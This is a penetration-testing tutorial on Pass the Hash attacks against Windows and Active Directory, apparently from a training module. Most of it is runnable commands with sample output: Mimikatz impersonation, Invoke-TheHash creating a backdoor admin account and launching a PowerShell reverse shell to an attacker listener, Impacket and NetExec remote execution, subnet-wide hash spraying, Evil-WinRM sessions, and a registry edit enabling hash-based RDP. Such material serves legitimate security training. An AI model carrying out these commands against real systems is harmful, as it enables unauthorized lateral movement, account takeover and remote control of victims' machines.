# Pass the Hash

## Table of Contents

- [Windows](#windows)
  - [Method 1: Mimikatz](#method-1-mimikatz)
  - [Method 2: Invoke-TheHash](#method-2-invoke-thehash)
- [Linux](#linux)
  - [Method 3: Impacket PsExec](#method-3-impacket-psexec)
  - [Method 4: NetExec](#method-4-netexec)
  - [Method 5: Evil-WinRM](#method-5-evil-winrm)
  - [Method 6: RDP](#method-6-rdp)

---

## The core idea

We touched on this briefly in the NTDS.dit guide, but it deserves its own deep dive: **Pass the Hash (PtH)** means authenticating to a system using a **password hash directly**, instead of the plaintext password. No cracking required — the hash itself is enough to log in.

This works because of how NTLM authentication is built: the password hash **never changes** between sessions (until the actual password is changed), and critically, **NTLM hashes aren't salted**. That means the exact same hash value will always authenticate successfully, over and over, regardless of whether anyone has ever "cracked" it into readable text.

### Where do these hashes come from?

Same sources we've already covered throughout this module:
- Dumping the local **SAM** database
- Extracting from **NTDS.dit** on a Domain Controller
- Pulling live credentials out of **LSASS** memory

For the examples below, assume we've recovered this NT hash for the user `john` in the `evilcorp.evil` domain:
```
64F12CDDAA88057E06A81B54E73B949B
```

---

## A quick word on NTLM

**NTLM** is Microsoft's older authentication protocol — a challenge-response system that verifies identity without the password ever being transmitted directly. It's technically been superseded by **Kerberos** as the default in Active Directory since Windows 2000, but NTLM is still widely supported (and used) for backward compatibility with legacy systems. That continued support is exactly why Pass the Hash remains such a reliable technique even today.

---

## Windows

### Method 1: Mimikatz

Mimikatz's `sekurlsa::pth` module launches a new process **impersonating a user**, using only their NTLM hash — no password needed.

Required parameters:
- `/user` — the account to impersonate
- `/rc4` or `/ntlm` — the NTLM hash
- `/domain` — the domain (or the computer name/`localhost`/`.` for a local account)
- `/run` — what program to launch as that user (defaults to `cmd.exe`)

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:john /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:evilcorp.evil /run:cmd.exe" exit
```

```
user    : john
domain  : evilcorp.evil
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
\_ msv1_0   - data copy : OK !
```

This pops a new `cmd.exe` window running in john's security context — from here, any action (like accessing a share only john has permission to) works exactly as if you'd logged in with his actual password.

---

### Method 2: Invoke-TheHash

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a PowerShell toolkit for Pass the Hash attacks over **SMB** or **WMI**, connecting via raw TCP rather than relying on native Windows authentication APIs. One nice detail: you don't need local admin rights on your *own* machine to run it — only the hash you're using needs to belong to an account with admin rights on the *target*.

### Required parameters

| Parameter | Meaning |
|-----------|------------|
| Target | Hostname or IP of the target |
| Username | Account to authenticate as |
| Domain | Target domain (skip for local accounts, or use `user@domain` format) |
| Hash | NTLM hash (accepts `LM:NTLM` or plain `NTLM` format) |
| Command | What to run — if omitted, it just checks whether the account/hash has WMI access |

### Example: creating a backdoor admin account via SMB

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain evilcorp.evil -Username john -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

```
VERBOSE: [+] evilcorp.evil\john successfully authenticated on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
```

This authenticated as `john` using only the hash, then used that access to create a brand-new local admin account (`mark`) on the target — all without ever knowing john's actual password.

### Example: getting a reverse shell via WMI

Set up a listener on your own machine first:
```powershell
PS C:\tools> .\nc.exe -lvnp 8001
```

Generate a PowerShell reverse shell payload (a site like [revshells.com](https://www.revshells.com/) can build this quickly). 

- Set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`

<img width="912" height="830" alt="image" src="https://github.com/user-attachments/assets/516ae9f9-cb55-4a93-add1-956f1f14c8fe" />

- Then trigger it on the target using the hash:
```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain evilcorp.evil -Username john -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64-encoded-payload>"
```

```
[+] Command executed with process id 520 on DC01
```

A connection then comes back to your Netcat listener — a full interactive shell on the target, again without ever needing john's plaintext password.

---

## Linux

### Method 3: Impacket PsExec

**Impacket** includes several PtH-capable command execution tools; `psexec` is one of the most common:

```bash
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

```
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Starting service AdzX.....
C:\Windows\system32>
```

Note the hash format here — `-hashes :NTLM` (empty before the colon means no LM hash is being supplied, just the NT hash). This drops you into a full interactive shell on the target.

Other Impacket tools that support the same technique:
- `impacket-wmiexec`
- `impacket-atexec`
- `impacket-smbexec`

---

### Method 4: NetExec

**NetExec** also supports Pass the Hash authentication directly.

#### Spraying a hash across a whole subnet

```bash
$ netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
SMB   172.16.1.10   [-] .\Administrator:...  STATUS_LOGON_FAILURE
SMB   172.16.1.5    [+] .\Administrator ... (Pwn3d!)
```

This tries the same hash against every host in the subnet, flagging `(Pwn3d!)` wherever it successfully grants local admin access. This is essentially "password spraying," just using a hash instead of a password — and a very common finding in real engagements, since organizations frequently reuse the **same local admin password** across many machines (often via gold images).

> **Lockout caution:** spraying across many hosts can trigger account lockouts on domain accounts if you're not careful. If you specifically only want to test a hash against one host at a time rather than broadly, add `--local-auth` to scope it down.

> **A free remediation tip for real engagements:** if you find widespread local admin password reuse like this, recommending **LAPS** (Local Administrator Password Solution) is a strong, concrete fix — it randomizes each machine's local admin password and can rotate it automatically.

#### Running a command directly

```bash
$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

```
[+] .\Administrator ... (Pwn3d!)
[+] Executed command
MS01\administrator
```

---

### Method 5: Evil-WinRM

If SMB is blocked, or you need an alternative protocol, **Evil-WinRM** also supports Pass the Hash via PowerShell Remoting:

```bash
$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> For a **domain** account, include the domain in the username: `administrator@evilcorp.evil`

---

### Method 6: RDP

You can even use Pass the Hash to get full **graphical** remote desktop access — but there's a prerequisite.

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

<img width="782" height="284" alt="image" src="https://github.com/user-attachments/assets/6c9c1c82-c7de-4f72-aca5-699f865a395e" />

#### Enabling Restricted Admin Mode

By default, RDP's "Restricted Admin Mode" (which allows PtH-style logins) is **disabled**. It needs to be turned on via a registry key:

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Connecting with the hash

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```bash
$ xfreerdp /v:10.129.201.126 /u:john /pth:64F12CDDAA88057E06A81B54E73B949B
```

This opens a full RDP session authenticated purely via the hash, no plaintext password involved.

---

## A caveat: UAC can block local-account PtH

**User Account Control (UAC)** can restrict which local accounts are even allowed to perform *remote* administration — which directly affects whether Pass the Hash will work.

The relevant setting:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

- `0` (default) → **only** the built-in `Administrator` account (RID 500) can perform remote admin actions
- `1` → other local admin accounts can too

There's also an extra layer: if `FilterAdministratorToken` is enabled (it's off by default), even the RID 500 Administrator account gets subjected to UAC restrictions, and remote PtH will fail against it too.

**Important:** these restrictions only apply to **local** accounts. If you're authenticating with a **domain** account that happens to have admin rights on a given computer, none of this applies — Pass the Hash will work as normal.

---

## Quick Recap

| Tool | Platform | Access style |
|------|-------------|------------------|
| Mimikatz (`sekurlsa::pth`) | Windows | Spawns a new local process as the target user |
| Invoke-TheHash | Windows (PowerShell) | Remote command execution via SMB or WMI |
| Impacket PsExec/WMIExec/etc. | Linux | Remote shell/command execution |
| NetExec | Linux | Credential testing/spraying + command execution |
| Evil-WinRM | Linux | PowerShell Remoting session |
| xfreerdp `/pth` | Linux | Full graphical RDP session (needs Restricted Admin Mode enabled) |

**Key idea:** Pass the Hash exists because NTLM authentication only ever needs the hash, never the plaintext password — making it a powerful fallback whenever a password hash resists cracking. It's also an extremely common lateral-movement technique in real engagements specifically because local admin passwords are so frequently reused across machines in the same environment.
